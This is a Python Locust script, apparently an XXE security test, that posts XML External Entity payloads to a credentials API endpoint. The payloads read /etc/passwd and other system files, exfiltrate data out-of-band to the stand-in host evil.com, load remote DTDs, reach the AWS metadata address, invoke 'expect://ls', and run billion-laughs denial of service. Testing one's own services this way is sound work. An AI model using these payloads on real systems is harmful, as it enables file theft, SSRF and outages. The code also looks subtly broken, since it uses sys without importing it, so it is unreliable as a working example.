import os
import csv
import json
import logging
import uuid
from locust import HttpUser, task, SequentialTaskSet, constant, events

stat_file = open('/tmp/xxe_attacks_stats.csv', 'w')
log = logging.getLogger(__name__)

for i in ['../../']:
    path = os.path.realpath(os.path.join(os.path.dirname(os.path.realpath(__file__)), i))
    if path not in sys.path:
        sys.path.insert(0, path)

from libs.jsonconfig.jsonconfig import JsonConfig


class XxeAttacks(SequentialTaskSet):
    json = None
    stat_file = None

    @events.init_command_line_parser.add_listener
    def _collect_(parser):
        parser.add_argument("--stat_file", type=str, env_var="LOCUST_MY_ARGUMENT", default="", help="stat file name")
        parser.add_argument("--json", type=str, help="--json=<exact json path>. Not relative path like ~/")
        args = parser.parse_args()
        XxeAttacks.json = JsonConfig(args.json)

    @events.test_start.add_listener
    def _(environment, **kw):
        log.info(f"Custom argument supplied: {environment.parsed_options.stat_file}")
        XxeAttacks.stat_file = environment.parsed_options.stat_file

    @events.request.add_listener
    def my_request_handler(request_type, name, response_time, response_length, response,
                           exception, *args, **kwargs):
        if exception:
            log.info(f"Request to {name} failed with exception {exception}")
        else:
            log.info(f"Successfully made a request to: {name}")
            filename = XxeAttacks.stat_file
            with open(filename, 'a', newline='') as csv_file:
                writer = csv.writer(csv_file)
                writer.writerow([name, request_type, response_time, response_length])

    def on_start(self):
        payload = XxeAttacks.json.payload(api_call="on_start")
        version = XxeAttacks.json.version(api_call="on_start")
        uri = XxeAttacks.json.uri(api_call="on_start")
        response = self.client.post(uri.format(version),
                                    json=payload,
                                    verify=False,
                                    catch_response=True)
        token_json = response.json()
        self.token = token_json["access_token"]
        log.debug("self.token={}".format(self.token))
        return self.token

    @task
    def test_xxe_in_xml_content_type(self):
        headers = {
            "Authorization": f"Bearer {self.token}",
            "Content-Type": "application/xml"
        }

        # XXE payloads to test XML External Entity injection
        xxe_payloads = [
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE credential [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<credential>
  <name>&xxe;</name>
  <username>admin</username>
  <password>password</password>
  <type>OS</type>
</credential>''',

            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE credential [
  <!ENTITY xxe SYSTEM "file:///windows/system32/drivers/etc/hosts">
]>
<credential>
  <name>test</name>
  <username>&xxe;</username>
  <password>password</password>
  <type>OS</type>
</credential>''',

            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE credential [
  <!ENTITY xxe SYSTEM "http://evil.com/malicious.dtd">
]>
<credential>
  <name>test</name>
  <username>admin</username>
  <password>&xxe;</password>
  <type>OS</type>
</credential>''',

            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE credential [
  <!ENTITY % xxe SYSTEM "file:///etc/passwd">
  <!ENTITY callhome SYSTEM "http://evil.com/?%xxe;">
]>
<credential>
  <name>test</name>
  <username>admin</username>
  <password>password</password>
  <type>&callhome;</type>
</credential>'''
        ]

        for xxe_payload in xxe_payloads:
            with self.client.post("/api/v3/raw-credentials",
                                  headers=headers,
                                  verify=False,
                                  data=xxe_payload,
                                  catch_response=True) as response:

                if response.status_code in [200, 201] and ("root:" in response.text or "admin:" in response.text):
                    log.critical(f"CRITICAL: XXE vulnerability detected - file content leaked")
                    response.success()
                elif response.status_code in [200, 201]:
                    log.warning(f"XXE payload processed - potential vulnerability")
                    response.success()
                else:
                    log.info(f"XXE attack blocked: {response.status_code}")

    @task
    def test_xxe_via_json_with_xml_content(self):
        headers = {"Authorization": f"Bearer {self.token}"}

        # Try XXE through JSON payloads containing XML
        json_xxe_payloads = [
            {
                "name": '''<?xml version="1.0"?><!DOCTYPE name [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><name>&xxe;</name>''',
                "username": "admin",
                "password": "password",
                "type": "OS"
            },
            {
                "name": "test",
                "username": '''<!DOCTYPE username [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>&xxe;''',
                "password": "password",
                "type": "OS"
            },
            {
                "name": "test",
                "username": "admin",
                "password": "password",
                "type": "OS",
                "extraInfo": [
                    {
                        "name": "config",
                        "value": '''<?xml version="1.0"?><!DOCTYPE config [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><config>&xxe;</config>'''
                    }
                ]
            }
        ]

        for payload in json_xxe_payloads:
            with self.client.post("/api/v3/raw-credentials",
                                  headers=headers,
                                  verify=False,
                                  json=payload,
                                  catch_response=True) as response:

                if response.status_code in [200, 201] and ("root:" in response.text or "admin:" in response.text):
                    log.critical(f"CRITICAL: XXE via JSON detected")
                    response.success()
                else:
                    log.info(f"XXE via JSON blocked: {response.status_code}")

    @task
    def test_blind_xxe_attacks(self):
        headers = {
            "Authorization": f"Bearer {self.token}",
            "Content-Type": "application/xml"
        }

        # Blind XXE payloads that don't return data directly
        blind_xxe_payloads = [
            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE credential [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://evil.com/?x=%file;'>">
  %eval;
  %exfiltrate;
]>
<credential>
  <name>test</name>
  <username>admin</username>
  <password>password</password>
  <type>OS</type>
</credential>''',

            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE credential [
  <!ENTITY % remote SYSTEM "http://evil.com/evil.dtd">
  %remote;
]>
<credential>
  <name>test</name>
  <username>admin</username>
  <password>password</password>
  <type>OS</type>
</credential>''',

            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE credential [
  <!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
<credential>
  <name>test</name>
  <username>admin</username>
  <password>password</password>
  <type>OS</type>
</credential>'''
        ]

        for blind_payload in blind_xxe_payloads:
            with self.client.post("/api/v3/raw-credentials",
                                  headers=headers,
                                  verify=False,
                                  data=blind_payload,
                                  catch_response=True) as response:

                if response.status_code in [200, 201]:
                    log.warning(f"Blind XXE payload processed - monitoring external connections required")
                    response.success()
                else:
                    log.info(f"Blind XXE blocked: {response.status_code}")

    @task
    def test_xxe_dos_attacks(self):
        headers = {
            "Authorization": f"Bearer {self.token}",
            "Content-Type": "application/xml"
        }

        # XXE DoS payloads (Billion Laughs, Quadratic Blowup)
        xxe_dos_payloads = [
            '''<?xml version="1.0"?>
<!DOCTYPE credential [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
]>
<credential>
  <name>&lol5;</name>
  <username>admin</username>
  <password>password</password>
  <type>OS</type>
</credential>''',

            '''<?xml version="1.0"?>
<!DOCTYPE credential [
  <!ENTITY a "a string that is expanded">
''' + ''.join([f'  <!ENTITY a{i} "{" ".join(["&a"] * 10000)}">\n' for i in range(10)]) + ''']>
<credential>
  <name>&a9;</name>
  <username>admin</username>
  <password>password</password>
  <type>OS</type>
</credential>''',

            '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE credential [
  <!ENTITY dos SYSTEM "file:///dev/random">
]>
<credential>
  <name>&dos;</name>
  <username>admin</username>
  <password>password</password>
  <type>OS</type>
</credential>'''
        ]

        for dos_payload in xxe_dos_payloads:
            import time
            start_time = time.time()

            with self.client.post("/api/v3/raw-credentials",
                                  headers=headers,
                                  verify=False,
                                  data=dos_payload,
                                  catch_response=True) as response:

                end_time = time.time()
                response_time = end_time - start_time

                if response_time > 30:  # If response takes more than 30 seconds
                    log.critical(f"CRITICAL: XXE DoS successful - Response time: {response_time}s")
                    response.success()
                elif response.status_code == 500:
                    log.warning(f"XXE DoS caused server error: {response.status_code}")
                else:
                    log.info(f"XXE DoS blocked: {response.status_code}")

    @task
    def test_xxe_protocol_handlers(self):
        headers = {
            "Authorization": f"Bearer {self.token}",
            "Content-Type": "application/xml"
        }

        # Test different protocol handlers
        protocol_payloads = [
            '''<?xml version="1.0"?>
<!DOCTYPE credential [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<credential>
  <name>&xxe;</name>
  <username>admin</username>
  <password>password</password>
  <type>OS</type>
</credential>''',  # AWS metadata

            '''<?xml version="1.0"?>
<!DOCTYPE credential [
  <!ENTITY xxe SYSTEM "ftp://evil.com/test.txt">
]>
<credential>
  <name>&xxe;</name>
  <username>admin</username>
  <password>password</password>
  <type>OS</type>
</credential>''',  # FTP protocol

            '''<?xml version="1.0"?>
<!DOCTYPE credential [
  <!ENTITY xxe SYSTEM "gopher://evil.com:70/test">
]>
<credential>
  <name>&xxe;</name>
  <username>admin</username>
  <password>password</password>
  <type>OS</type>
</credential>''',  # Gopher protocol

            '''<?xml version="1.0"?>
<!DOCTYPE credential [
  <!ENTITY xxe SYSTEM "expect://ls">
]>
<credential>
  <name>&xxe;</name>
  <username>admin</username>
  <password>password</password>
  <type>OS</type>
</credential>'''  # Expect protocol (if available)
        ]

        for protocol_payload in protocol_payloads:
            with self.client.post("/api/v3/raw-credentials",
                                  headers=headers,
                                  verify=False,
                                  data=protocol_payload,
                                  catch_response=True) as response:

                if response.status_code in [200, 201]:
                    log.warning(f"Protocol handler XXE may be successful")
                    response.success()
                else:
                    log.info(f"Protocol handler XXE blocked: {response.status_code}")


class XxeAttacksUser(HttpUser):
    wait_time = constant(1)
    tasks = [XxeAttacks]
